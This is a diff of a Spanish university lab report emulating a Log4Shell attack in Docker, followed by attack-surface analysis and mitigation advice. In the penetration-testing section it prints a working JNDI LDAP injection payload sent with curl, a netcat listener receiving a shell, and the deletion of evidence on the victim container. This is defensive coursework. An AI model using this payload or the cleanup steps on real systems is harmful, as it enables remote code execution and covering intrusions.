@@ -21,6 +21,8 @@
 \definecolor{gray}{rgb}{0.5,0.5,0.5}
 \definecolor{mauve}{rgb}{0.58,0,0.82}
 \usepackage{indentfirst}
+\usepackage{geometry}
+\usepackage{array}
 \lstset{frame=tb,
   language=Java,
   aboveskip=3mm,
@@ -49,7 +51,7 @@
 \authorsaffiliations{Universidad Mayor}
 \course{Análisis y Explotación de Vulnerabilidades}
 \professor{Prof. Tomas Vera}
-\duedate{Septiembre 09, 2024}
+\duedate{Septiembre 11, 2024}
 
 \begin{document}
 \maketitle
@@ -80,7 +82,11 @@
 
 \justify
 
-\hspace{1.27cm} En este siglo XXI y en el futuro la seguridad y el análisis de los sistemas se ha vuelto un pilar fundamental para el desarrollo de sistemas confiables, con el crecimiento exponencial de ataques a nivel informático y perdidas a pequeña y gran escala de entidades y organizaciones publicas y privadas. 
+\hspace{1.27cm} En este siglo XXI y en el futuro la seguridad y el análisis de los sistemas se ha vuelto un pilar fundamental para el desarrollo de sistemas confiables, con el crecimiento exponencial de ataques a nivel informático y perdidas a pequeña y gran escala de entidades y organizaciones publicas y privadas. Recientemente, una de las vulnerabilidades más críticas detectadas ha sido Log4Shell (CVE-2021-44228), la cual afecta a librería Log4j, una popular biblioteca de registro utilizada ampliamente en aplicaciones Java. Esta vulnerabilidad permite la ejecución remota de código (RCE), lo que la convierte en un blanco atractivo para atacantes que buscan comprometer servidores y aplicaciones a través de solicitudes maliciosas.
+
+El objetivo de este informe de laboratorio es analizar la superficie de ataque de Log4Shell en un entorno controlado, evaluando los vectores de ataque más relevantes, los actores malintencionados que podrían explotarla, y los recursos vulnerables que podrían verse afectados. Durante las pruebas de laboratorio, se simulo un escenario de ataque para comprender el impacto de esta vulnerabilidad en aplicaciones que utilizan Log4j.
+
+Este análisis es fundamental para identificar las medidas de mitigación necesarias que permitan reducir el riesgo de explotación y asegurar la infraestructura de la organización frente a futuras amenazas. A lo largo del informe, se detallarán los pasos a seguir y resultados de las pruebas donde se propondrán recomendaciones clave para mitigar el impacto de Log4Shell en los sistemas evaluados.
 
 % \hfill \break (comando tipo enter en word)
 
@@ -89,7 +95,7 @@
 \section{\large Emulación de un Ataque Log4Shell}
 
 \subsection{Objetivo} 
-El objetivo de este informe es realizar por medio de pruebas empíricas un laboratorio emulando un ataque de Log4Shell, desarrollando que el estudiante comprenda las herramientas y técnicas utilizadas en el proceso de la implementación de este ataque. Este ejercicio práctico tiene como finalizad profundizar el entendimiento de las vulnerabilidades y de seguridad de aplicaciones web y fomentar el desarrollo de habilidades técnicas para la identificación y mitigación de riesgos de ciberseguridad. 
+El objetivo de este informe es realizar por medio de pruebas empíricas un laboratorio emulando un ataque de Log4Shell(CVE-2021-44228)\citep{log4shell}, con el fin de lograr que el estudiante comprenda las herramientas y técnicas utilizadas en el proceso de la implementación de este ataque. Este ejercicio práctico tiene como finalidad profundizar el entendimiento de las vulnerabilidades y de seguridad de aplicaciones web y fomentar el desarrollo de habilidades técnicas para la identificación y mitigación de riesgos de ciberseguridad. 
 \newpage %para pasar a otra pagina
  
 
@@ -151,7 +157,10 @@ Para un desarrollador y una usuario de docker y Git existen varios aspectos clav
 
 \begin{itemize}
     \item \texttt{docker exec -it my\_container \{comando de ruta u otro\}}: Con este comando podemos ingresar de modo interactivo a la terminal del contenedor donde podemos colocar alguna ruta en especial. Las más utilizadas son \texttt{/bin/bash}, \texttt{/bin/sh} y \texttt{ls}.
-    \item \texttt{docker inspect}: Con este comando podemos inspeccionar todo lo que contiene el contenedor de Docker. Para este laboratorio se utilizará un comando un poco más especial para obtener la IP de cada contenedor inicializado. Este comando será el siguiente: \texttt{docker inspect -f '\{\{range.NetworkSettings.Networks\}\}\{\{.IPAddress\}\}\{end\}' \{nombre de contenedor o ID\}}.
+    \item \texttt{docker inspect}: Con este comando podemos inspeccionar todo lo que contiene el contenedor de Docker. Para este laboratorio se utilizará un comando un poco más especial para obtener la IP de cada contenedor inicializado. Este comando será el siguiente: 
+\begin{lstlisting}
+docker inspect -f '{{range.NetworkSettings.Networks}}{{.IPAddress}}{{end}}' (ID contenedor)
+\end{lstlisting}
     \item \texttt{docker ps}: Para verificar si el contenedor está en ejecución.
     \item \texttt{docker images}: Para verificar las imágenes contenidas localmente en Docker.
     \item \texttt{git clone \{url repositorio\}}: Para copiar localmente el o los repositorios que necesitemos.
@@ -238,6 +247,7 @@ Una vez guardado el Dockerfile  lo tenemos que construir. Dentro de la ubicació
     \label{fig:figura12}
 \end{figure} 
 
+\subsubsection{Iniciar JNDI-EXPLOIT}
 Ahora se debe ejecutar el comando para iniciar la imagen generada. Para este contenedor utilizaremos el comando \textbf{\texttt{docker run -it -p 8180:8180 -p 1099:1099 -p 1389:1389 jndi-exploit}} Con este comando el contenedor se inicia en modo interactivo lo que quiere decir que entraremos directamente a la terminal del contenedor.
 Una vez dentro del contenedor se procede a revisar si se encuentra el archivo que descargo en el proceso de la construcción de la imagen. Este archivo ese el \textbf{\texttt{JNDI-Injection-Exploit.jar}}
 \begin{figure}[H]
@@ -248,7 +258,11 @@ Una vez dentro del contenedor se procede a revisar si se encuentra el archivo qu
 \end{figure} 
 
 Antes de levantar la aplicación debemos verificar la ip de la red docker.
-para esto ejecutamos el comando docker ps para saber cual es nuestro id de contenedor y luego el comando textbf\texttt{docker inspect -f '\{\{range.NetworkSettings.Networks\}\}\{\{.IPAddress\}\}\{end\}' \{nombre de contenedor o ID\}}. para saber la ip otorgada.
+para esto ejecutamos el comando docker ps para saber cual es nuestro id de contenedor y luego el comando:
+\begin{lstlisting}
+docker inspect -f '{{range.NetworkSettings.Networks}}{{.IPAddress}}{{end}}' (ID contenedor)
+\end{lstlisting}. 
+para saber la ip otorgada.
 
 \begin{figure}[H]
     \centering
@@ -258,7 +272,7 @@ para esto ejecutamos el comando docker ps para saber cual es nuestro id de conte
 \end{figure}
 
 Ahora que conocemos la ip tenemos que ejecutar el comando para iniciar la aplicación.
-El comando ejecutado es el que podemos ver en la Figura~\ref{fig:figura2}. Como observacion se debe tener en cuenta las comillas que van dentro del comando, ya que las comillas que se tienen en la guía no levantan bien el comando de la shell.
+El comando ejecutado es el que podemos ver en la Figura~\ref{fig:figura15}. Como observación se debe tener en cuenta las comillas que van dentro del comando, ya que las comillas que se tienen en la guía no levantan bien el comando de la shell. Tambien iniciada la aplicación tenemos que fijarnos en el parametro de ldap que nos servira para poder realizar el ataque.
 \begin{figure}[H]
     \centering
     \caption{Comando para iniciar la aplicación JNDI-EXPLOIT}
@@ -266,19 +280,184 @@ El comando ejecutado es el que podemos ver en la Figura~\ref{fig:figura2}. Como 
     \label{fig:figura15}
 \end{figure}
 Ahora que tenemos levantada la aplicación debemos abrir una terminal nueva en el mismo contenedor de JNDI y aplicar el comando de netcat. Debemos aplicar el comando \textbf{\texttt{nc -lvp 8083}}. El desglose de este comando es el siguiente
+\begin{itemize}
+\item Netcat (nc) : El comando nc es una herramienta de red que lee y escribe datos en redes desde línea de comandos \citep{netcat} 
+\item Listen (l): Esta opción indica a netcat que debe funcionar en modo servidor, es decir que debe escuchar las conexiones entrantes.
+\item Verbose (v): Esta opción habilita el modo verbose, lo que significa que netcat proporcionara información adicional y con mas detalle sobre lo que se esta conectando.
+\item Port(p): Esta opción indica el puerto en el que netcat debe escuchcar las conexiones entrantes. Para este laboratorio el puerto a utilizar es el 8083.
+\end{itemize}
 
+Para acceder al contenedor escribimos el comando \textbf{\texttt{docker exec -it 513d /bin/bash}}. y luego ejecutamos el comando de netcat ver Figura~\ref{fig:figura16}
+\begin{figure}[H]
+    \centering
+    \caption{Comando para iniciar la aplicación JNDI-EXPLOIT}
+    \includegraphics[width=1\linewidth]{img2/Imagen16.png}
+    \label{fig:figura16}
+\end{figure}
 
+\subsection{Pruebas de Penetración}
 
+Una vez inicializada las aplicaciones y conocidas las ips de la red debemos realizar el ataque, para esto debemos realizar el ataque por medio de curl (Client URL). Curl es una herramienta de línea de comandos, que permite la transferencia de datos hacia o desde un servidor sin interacción del usuario utilizando la biblioteca libcurl \citep{curl}.
+el comando curl se compone de la siguiente manera.
+\begin{lstlisting}
+curl (ip-victima):8080 -H 'X-Api-Version: ${jndi:(ldap-infectado)}'
+\end{lstlisting}
+Donde la ip-victima es la ip de la Vulnerable-app y ldap-infectado es la ip de JNDI-EXPLOIT. Por tanto el comando queda de la siguiente manera:
+\begin{lstlisting}
+curl http://172.17.0.2:8080 -H 'X-Api-Version: ${jndi:ldap://172.17.0.3:1389/hjvknt}'
+\end{lstlisting}
+La respuesta del comando sera Cookie Exploited Figura~\ref{fig:figura17} y podremos verificar que tenemos acceso al puerto ya que la termina de netcat nos informa que se ha generado una conexión Figura~\ref{fig:figura18}
+\begin{figure}[H]
+    \centering
+    \caption{Curl enviado desde terminal a aplicación vulnerable}
+    \includegraphics[width=1\linewidth]{img2/Imagen17.png}
+    \label{fig:figura17}
+\end{figure}
+\begin{figure}[H]
+    \centering
+    \caption{Netcat conectado}
+    \includegraphics[width=1\linewidth]{img2/Imagen18.png}
+    \label{fig:figura18}
+\end{figure}
 
+\subsubsection{Evidencia de Ataque Desde Netcat}
+Una vez dentro del contenedor podemos verificar que tenemos acceso a las carpetas. Para esto utilizaremos ls para verificar las carpetas contenidas ver Figura~\ref{fig:figura19}
+\begin{figure}[H]
+    \centering
+    \caption{Lista de carpetas del contenedor vulnerado}
+    \includegraphics[width=1\linewidth]{img2/Imagen19.png}
+    \label{fig:figura19}
+\end{figure}
+Ahora procederemos a crear algún archivo que identifique que tenemos podemos manipular el dentro de los archivos del contenedor. Para esta prueba crearemos un archivo nombrado lab.txt con un contenido ver Figura~\ref{fig:figura20}
+\begin{figure}[H]
+    \centering
+    \caption{Archivo creado en contenedor atacado}
+    \includegraphics[width=1\linewidth]{img2/Imagen20.png}
+    \label{fig:figura20}
+\end{figure}
 
+\subsubsection{Evidencia de Ataque Aplicación Vulnerada}
+Para poder visualizar que fuimos atacados entraremos al contenedor vulnerable por medio del comando:
+\begin{lstlisting}
+docker exec -it d03e /bin/sh
+\end{lstlisting}
+Luego ejecutaremos el comando "ls" para verificar la lista de carpetas del contenedor
+\begin{figure}[H]
+    \centering
+    \caption{Terminal de contenedor vulnerado}
+    \includegraphics[width=0.9\linewidth]{img2/Imagen21.png}
+    \label{fig:figura21}
+\end{figure}
 
-
+Ahora verificaremos dentro de la carpeta home si existe el archivo lab.txt y veremos todo lo escrito en ese archivo 
+\begin{figure}[H]
+    \centering
+    \caption{Visualización de evidencia de ataque}
+    \includegraphics[width=0.9\linewidth]{img2/Imagen22.png}
+    \label{fig:figura22}
+\end{figure}
+\subsubsection{Eliminación y Comprobación de Borrado de Evidencia}
+Ahora eliminaremos la evidencia desde el atacante utilizaremos el comando "rm lab.txt" luego verificaremos que la carpeta no tenga nada con el comand o"ls" y luego comprobaremos que estamos sobre la carpeta "/home" que es donde creamos nuestra evidencia de ataque Figura~\ref{fig:figura23}
+\begin{figure}[H]
+    \centering
+    \caption{Pasos con comandos de eliminación de evidencia}
+    \includegraphics[width=1\linewidth]{img2/Imagen23.png}
+    \label{fig:figura23}
+\end{figure}
+Ahora procedemos a verificar el contenedor atacado y verificar si existe el archivo. Para esta prueba se mostraran las dos terminales izquierda atacante y derecha atacado donde se verificara la eliminación del archivo creado en la carpeta "/home" Figura~\ref{fig:figura24}
+\begin{figure}[H]
+    \centering
+    \caption{Verificación de eliminación de evidencia atacante y atacado}
+    \includegraphics[width=1\linewidth]{img2/Imagen24.png}
+    \label{fig:figura24}
+\end{figure}
+Luego de esto debo cerrar la conexión de netcat con la combinación de teclas Ctrl+c. 
+De esta forma ya no estoy escuchando al contenedor atacado y damos por finalizado el alcance de las pruebas de laboratorio.
 
 \newpage
-\section{\large Conclusión}
+
+\section{Análisis de superficie de ataque}
+Para esta sección debemos saber primero que es una superficie de ataque " La superficie de ataque de una organización es la suma de las vulnerabilidades, las vías o los métodos (a veces denominados vectores de ataque) que los hackers pueden utilizar para obtener acceso no autorizado a la red o a los datos confidenciales, o para llevar a cabo un ciberataque"\citep{supataque}
+Entonces analizaremos sobre un contexto ficticio de una organización que no ha actualizado su librería y esta expuesta a este ataque, ya que tiene servicios en la nube donde tiene endpoint expuestos alojados en un servidor donde circula información sensible.
+
+\subsection{Vectores de Ataque Potenciales}
+
+\begin{itemize}
+    \item{Interfaz Web (API pública y panel de administración)}: Los usuarios pueden enviar solicitudes que log4j podría registrar, exponiendo la aplicación a la inyección de código malicioso.
+    \item Sistemas internos: Aplicaciones internas que también utilizan Log4j para monitoreo y registro de actividades.
+    
+    \item Servidores y servicios externos: Cualquier servicio externo que interactúe con el sistema y que genere logs, como servicios de mensajería, integraciones API, etc.
+\end{itemize}
+
+\subsection{Actores Malintencionados (Threat Actors)}
+
+\begin{itemize}
+\item Hackers individuales: Pueden intentar inyectar código malicioso a través de solicitudes HTTP, encabezados o campos de entrada que el sistema loguea.
+\item Grupos organizados: Podrían explotar la vulnerabilidad para ejecutar código remoto y obtener acceso a servidores sensibles.
+\item Usuarios internos deshonestos: Usuarios con acceso autorizado podrían explotar la vulnerabilidad para realizar ataques desde dentro de la red.
+\end{itemize}
+
+\subsection{Recursos Vulnerables}
+
+\begin{itemize}
+\item Datos de clientes: Información sensible, como nombres, direcciones, y números de cuentas bancarias.
+\item Credenciales de usuarios: Podrían ser expuestas o robadas si se explota con éxito la vulnerabilidad.
+\item Sistemas de producción: La ejecución remota de código podría comprometer la integridad de los servidores de producción, incluyendo la eliminación o modificación de datos.
+\end{itemize}
+
+\subsection{Escenarios de Ataque}
+
+\begin{itemize}
+\item Inyección de código malicioso a través de solicitudes HTTP: Un atacante podría enviar una solicitud maliciosa que se registre en los logs de la aplicación, lo que desencadena la ejecución del código malicioso. Este código podría permitir la creación de una puerta trasera en el servidor.
+\item Uso de JNDI para conexión remota: Al explotar la vulnerabilidad Log4Shell, un atacante podría engañar a la aplicación para que se conecte a un servidor controlado por el atacante, ejecutando código remoto desde allí.
+ \item Exfiltración de datos: Al obtener acceso remoto a los servidores, el atacante podría acceder a la base de datos y extraer información sensible.
+\end{itemize}
+
+\subsection{Impacto Potencial}
+
+El impacto potencial para la organización es alto ya que afecta la Confidencialidad, integridad y podría de forma moderada o no la disponibilidad.
+En general el que una organización se vea perjudicada por esta brecha de seguridad genera que su reputación se vea perjudicada resultando perdida de confianza en sus clientes. 
+
+\subsection{Recomendaciones de Mitigación}
+\begin{itemize}
+\item Actualizar Log4j: Se deben levantar todos los cofigos fuentes tanto desarrollados de manera propia como de proveedores y solicitar en un corto plazo la actualización y deploy en producción.
+\item Implementacion de Firewalls Web (WAF): Para filtrar y bloquear solicitudes sospechosas que puedan explotar esta vulnerabilidad.
+\item Monitoreo de logs: Analizar los logs de acceso y eventos inusuales para detectar intentos de explotación
+\item Robustes en capa TLS: Habilitar Mtls para endpoint mas críticos.
+\item Apagar protocolos no usados: Dar de baja protocolos que no ocupara el servidor, por ejemplo FTP SMTP, LDAP entre otros.
+\item Control de puertos: Solo abrir puertos necesarios.
+\end{itemize}
+
+\begin{table}[h]
+\centering
+\caption{Matriz de Superficie de Ataque}
+\begin{tabular}{| m{3cm} | m{3cm} | m{3cm} | m{3cm} | m{3cm} |}
+\hline
+\textbf{Vectores de Ataque} & \textbf{Actores de Amenaza} & \textbf{Recursos Vulnerables} & \textbf{Escenarios de Ataque} & \textbf{Impacto Potencial} \\
+\hline
+Interfaz Web & Hackers & Datos de Clientes & Inyección de solicitudes HTTP & Alto (Confidencialidad) \\
+\hline
+Sistemas Internos & Grupos Organizados & Credenciales de Usuarios & Conexión remota JNDI & Alto (Integridad) \\
+\hline
+Servicios Externos & Usuarios Internos & Sistemas de Producción & Exfiltración de datos & Moderado (Disponibilidad) \\
+\hline
+\end{tabular}
+\label{tabla:superficie_ataque}
+\end{table}
+
+\clearpage
+%\newpage
+
+\section{ Conclusión}
 
 
-En conclusión, el papel que juega el DPO es fundamental en el mundo del siglo XXI, ya que asegura que las organizaciones no solo cumplan con las obligaciones legales, sino que también adopten un enfoque dinámico y responsable hacia la protección de datos. A medida que la tecnología y las regulaciones avanzan, la importancia del DPO continuará creciendo, consolidándose como un pilar fundamental en la gestión de la privacidad y la seguridad de la información.
+Las pruebas de laboratorio realizadas sobre la vulnerabilidad Log4Shell(CVE-2021-44228) han demostrado lo critico de esta falla de seguridad en sistemas que emplean Log4j para la gestión de logs. A través del vector de ataque usado en la prueba, como la inyección de solicitudes maliciosas mediante HTTP y la explotación de JNDI, se ha confirmado la capacidad de los atacantes para ejecutar código de manera remota y comprometer tanto los datos confidenciales como la integridad de los sistemas afectados ya sean a poca o gran escala.
+
+Estos escenarios de ataque destacan la importancia de implementar medidas de mitigación, como la actualización de Log4j a versiones seguras, la desactivación de funciones innecesarias como las búsquedas JNDI, y la aplicación de controles de seguridad adicionales, como el uso de firewalls de aplicaciones web (WAF), robustes en capa TLS migrandos a Mtls entre otras.
+
+Los resultados obtenidos subrayan que la exposición de sistemas vulnerables puede tener consecuencias graves para las organizaciones, incluyendo el robo de datos sensibles y el compromiso de servidores críticos. Esto refuerza la necesidad de estar continuamente alerta ante nuevas amenazas y de mantener una estrategia de seguridad proactiva que minimice el riesgo de explotación de este tipo de vulnerabilidades.
+
+
 
 
 \newpage
